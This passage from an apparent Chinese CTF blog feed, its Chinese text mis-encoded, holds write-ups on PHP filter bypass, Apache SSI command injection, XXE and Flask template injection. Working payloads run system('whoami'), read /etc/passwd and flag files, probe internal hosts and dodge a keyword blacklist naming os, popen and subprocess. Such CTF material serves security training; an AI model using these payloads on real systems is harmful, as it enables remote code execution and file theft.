punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                j <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{0}'^'{1}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span></code></pre><p>ä¸€æ¬¡ä»£ç æ‰§è¡Œåªèƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œè¯­å¥çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸èƒ½æ‰§è¡Œè¯­å¥ï¼Œæ‰€ä»¥éœ€è¦æ‰§è¡Œä¸¤æ¬¡ä»£ç æ‰§è¡Œï¼Œæž„é€ </p><pre><code>assert($_GET[_]);</code></pre><p>ä½¿ç”¨è„šæœ¬å¯¹æ¯ä¸ªå­—æ¯è¿›è¡Œè½¬æ¢ï¼Œç„¶åŽæ‹¼æŽ¥</p><pre><code>$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');//$_='assert';$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');//$__='_GET';$___=$$__;//$___='$_GET';$_($___[_]);//assert($_GET[_]);</code></pre><p>payload</p><pre><code>$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');$___=$$__;$_($___[_]);&amp;_=phpinfo();</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005559983.png" alt="22"><br>ç»æœ¬åœ°æµ‹è¯•ï¼Œå‘çŽ°è¿™ç§æ–¹æ³•å¯ä»¥åœ¨<code>php5</code>ä»¥åŠ<code>php7.0.9</code>ç‰ˆæœ¬ç§ä½¿ç”¨ï¼Œå› ä¸ºassert()çš„é—®é¢˜ï¼Œå¹¶ä¸æ˜¯å¼‚æˆ–ä¸èƒ½ä½¿ç”¨<br>æ³¨ï¼šPHP5ä½Žç‰ˆæœ¬æœ‰äº›å¯èƒ½å› ä¸ºmagic_quotes_gpcå¼€å¯çš„å…³ç³»å¯¼è‡´æ— æ³•åˆ©ç”¨<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005611583.png" alt="23"><br>å½“è¿‡æ»¤å­—ç¬¦çš„èŒƒå›´æ²¡æœ‰é‚£ä¹ˆå¤§ï¼Œæˆ–è€…åªæ˜¯è¿‡æ»¤å…³é”®å­—çš„æ—¶å€™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è„šæœ¬</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> stringchar <span class="token operator">=</span> string<span class="token punctuation">.</span>printablecmd <span class="token operator">=</span> <span class="token string">'system'</span>tmp1<span class="token punctuation">,</span>tmp2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token keyword">for</span> res <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> char<span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> ord<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp1 <span class="token operator">+=</span> i                tmp2 <span class="token operator">+=</span> j                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{}'^'{}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>PS C:\Users\Administrator&gt; php -r "var_dump('000000'^'CICDU]');"Command line code:1:string(6) "system"</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005741747.png" alt="24"><br>å†æ”¾ä¸ªç½‘ä¸Šçœ‹åˆ°çš„payload</p><pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo//${_GET}{%ff}();&amp;%ff=phpinfo</code></pre><h3 id="URLç¼–ç å–åç»•è¿‡"><a href="#URLç¼–ç å–åç»•è¿‡" class="headerlink" title="URLç¼–ç å–åç»•è¿‡"></a>URLç¼–ç å–åç»•è¿‡</h3><pre><code>é€‚ç”¨PHPç‰ˆæœ¬ï¼šæ— é™åˆ¶</code></pre><p>è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªä¾‹é¢˜<br>å½“PHP&gt;=7æ—¶ï¼Œå¯ä»¥ç›´æŽ¥åˆ©ç”¨å–åæž„é€ payload</p><pre><code>PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'phpinfo'));"Command line code:1:string(21) "%8F%97%8F%96%91%99%90"</code></pre><pre><code>(~%8F%97%8F%96%91%99%90)();#phpinfo();</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005814900.png" alt="25"><br>æœ‰å‚æ•°çš„</p><pre><code>PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'system'));"Command line code:1:string(18) "%8C%86%8C%8B%9A%92"PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'whoami'));"Command line code:1:string(18) "%88%97%90%9E%92%96"</code></pre><p>payload</p><pre><code>(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);#system('whoami');</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005839305.png" alt="26"></p><p>å½“<code>5&lt;=PHP&lt;=7.0.9</code>æ—¶ï¼Œéœ€è¦å†æ‰§è¡Œä¸€æ¬¡æž„é€ å‡ºæ¥çš„å­—ç¬¦ï¼Œæ‰€ä»¥å‚è€ƒä¸Šé¢é‚£ç§<code>å¼‚æˆ–æ‹¼æŽ¥</code>çš„æ–¹æ³•</p><pre><code>$_=(~'%9E%8C%8C%9A%8D%8B');$__='_'.(~'%AF%B0%AC%AB');$___=$$__;$_($___[_]);#assert($_POST[_]);</code></pre><p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005919729.png" alt="27"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF:2020-EasySearch</title>
      <link href="2021/07/20/bjdctf-2020-easysearch/"/>
      <url>2021/07/20/bjdctf-2020-easysearch/</url>
      
        <content type="html"><![CDATA[<h2 id="ApacheSSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž"><a href="#ApacheSSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž" class="headerlink" title="ApacheSSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž"></a>ApacheSSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž</h2><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><h2 id="BJDCTF-2020-EasySearch"><a href="#BJDCTF-2020-EasySearch" class="headerlink" title="BJDCTF:2020-EasySearch"></a>BJDCTF:2020-EasySearch</h2><p><img src="/2021/07/20/bjdctf-2020-easysearch/1.png" alt="1"></p><p>æ‰«æåˆ°äº†index.php.swp</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>        <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Random 5 times</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">''</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string">"public/"</span><span class="token punctuation">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> '            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Hello<span class="token punctuation">,</span><span class="token string">'.$_POST['</span>username<span class="token string">'].'</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>'<span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>            <span class="token keyword">echo</span> <span class="token string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token delimiter">?></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p><img src="/2021/07/20/bjdctf-2020-easysearch/2.png" alt="2"></p><p><img src="/2021/07/20/bjdctf-2020-easysearch/3.png" alt="3"></p><p>çœ‹åˆ°æœ‰ä¸ªshtmlæ–‡ä»¶ï¼ŒæŽ¨æµ‹ï¼šApache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žï¼Œåªèƒ½åœ¨usernameè¿›è¡Œæ³¨å…¥ï¼š</p><pre><code>&lt;!--#exec cmd="ls ../"--&gt;</code></pre><p><img src="/2021/07/20/bjdctf-2020-easysearch/4.png" alt="4"></p><p><strong>è®¿é—®url/public/dd95b8ad08dd3c2dc922651bcf926300acf0a5d2.shtml</strong></p><p><img src="/2021/07/20/bjdctf-2020-easysearch/5.png" alt="5"></p><p>è®¿é—®è¿™ä¸ªflag</p><p><img src="/2021/07/20/bjdctf-2020-easysearch/6.png" alt="6"></p><p>æˆ–è€…</p><pre><code>&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2" --&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ApacheSSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF:2019-TrueXMLcookbook</title>
      <link href="2021/07/19/nctf-2019-truexmlcookbook/"/>
      <url>2021/07/19/nctf-2019-truexmlcookbook/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040125956.png" alt="1"></p><p>é¢˜ç›®æç¤ºXXE</p><p>exp:</p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "file:///etc/passwd"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035741618.png" alt="2"></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035821248.png" alt="3"></p><p><strong>çœ‹æºç ï¼š</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035845200.png" alt="4"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Ã¨Â´Â¦Ã¥ÂÂ·</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Ã¥Â¯Â†Ã§&amp;nbsp;Â</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>æ²¡ä»€ä¹ˆå¤§ç”¨</p><p><strong>è®¿é—®etc/hosts</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "file:///etc/hosts"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035921253.png" alt="5"></p><p><strong>è®¿é—®proc/net/arp</strong></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "file:///proc/net/arp"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035942111.png" alt="6"></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "http://10.0.163.2"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040030748.png" alt="7"></p><p><strong>è¿›è¡Œcæ®µæ‰«æï¼š</strong></p><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040106473.png" alt="8"></p><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719035651939.png" alt="9"></p><pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM "http://10.0.163.6"&gt;  ]&gt;  &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="/2021/07/19/nctf-2019-truexmlcookbook/image-20210719040014927.png" alt="10"></p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF:2020-FlaskAPP</title>
      <link href="2021/07/18/gyctf-2020-flaskapp/"/>
      <url>2021/07/18/gyctf-2020-flaskapp/</url>
      
        <content type="html"><![CDATA[<p>åœ¨text_decode = base64.b64decode(text.encode())å¤„çš„æŠ¥é”™è¯»å–åˆ°éƒ¨åˆ†æºç :</p><p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719015136254.png" alt="1"></p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/decode'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span>        text_decode <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> <span class="token string">"ç»“æžœ ï¼š {0}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>text_decode<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">"no no no !!"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span>  render_template_string<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span></code></pre><p>sstiæ³¨å…¥</p><p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719015737157.png" alt="2"></p><p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719015715188.png" alt="3"></p><p>æŸ¥çœ‹æ ¹ç›®å½•ï¼š</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}</code></pre><p>nonono</p><p>è¯»æºç ï¼š</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}</code></pre><p><img src="/2021/07/18/gyctf-2020-flaskapp/image-20210719020025146.png" alt="4"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;,</span>                  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> black_list <span class="token punctuation">:</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> str<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">1</span></code></pre><p>é»‘åå•è¿‡æ»¤äº†è¿™äº›å‡½æ•°</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}</code></pre><p>['bin', 'boot', 'dev',  'etc', 'home', 'lib',  'lib64', 'media', 'mnt', 'opt', 'proc', 'root',  'run', 'sbin', 'srv',  'sys', 'tmp', 'usr',  'var', 'this_is_the_flag.txt',  '.dockerenv', 'app']</p><p><strong>this_is_the_flag.txt</strong></p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}</code></pre><p><img 